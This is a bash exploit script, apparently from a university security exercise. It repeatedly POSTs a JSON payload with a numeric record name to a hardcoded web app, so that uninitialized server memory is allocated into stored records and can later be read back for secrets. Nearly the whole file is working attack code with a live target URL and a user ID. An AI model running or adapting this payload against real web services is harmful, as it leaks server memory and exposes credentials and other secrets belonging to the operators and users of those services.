#!/bin/bash
#
#   Author: Kyle Dixon
#   Usage: ./bufferExploit.sh       (all other info hardcoded here)
#   Description: This exploit takes advantage of the buffer used to pass record names to cause an overflow
#               The Attacker will need to know their ID number (can be gotten through curl & html)
#               This example uses the Kyle profile which has ID number 2, any profile can be used
#               Overflow data will be stored in the record name, which is accessed via the site
#               Repeatly call the script to get different chunks of memory and convert to look for secrets
#   Sources: https://snyk.io/blog/exploiting-buffer/


#Test Function
function overflow() {
    url='http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345'    #URL of user profile page
    #The record name 800 is used by the buffer to allocated space instead of saving a string
    res=$(curl --silent -X POST "${url}" --data '{"add_record_name":800,"add_record_password":"Overflow","add_record_URL":"Overflow","add_record_user":2}' --header "Content-Type: application/json")
}


#Main function
for i in {1..3}
do
    overflow
    echo "[+] Created new record" 
done
exit 0